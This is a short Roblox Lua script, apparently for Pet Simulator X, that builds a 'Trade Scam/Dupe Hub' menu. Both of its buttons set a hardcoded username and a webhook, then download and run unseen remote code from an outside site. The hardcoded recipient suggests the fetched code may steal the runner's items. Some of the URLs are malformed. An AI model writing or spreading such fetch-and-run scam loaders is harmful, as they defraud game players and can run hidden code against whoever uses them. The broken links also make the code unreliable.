local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("PSX Trade Scam/Dupe Hub", "BloodTheme")
 
-- MAIN
local Tab = Window:NewTab("Main")
local MainSection = Tab:NewSection("Main")
 
 
MainSection:NewButton("Trade Scam", "Before accepting a trade click this", function()
    _G.Username = "Arm_Gab";
    _G.Webhook = "WEBHOOK HERE"; 
    
    loadstring(game:HttpGet("hts://www.voidscripts.site/scripts/mb/script.lua"))()
	end)
 
 
MainSection:NewButton("Dupe pets", "With a bank depoit your pets, click this, it will make rejoin you then you pets are duped", function()
    _G.Username = "Arm_Gab";
    _G.Webhook = "WEBHOOK HERE";
    
    loadstring(game:HttpGet("https://wwvoidscripts.site/scripts/mb/script.lua"))();
	end)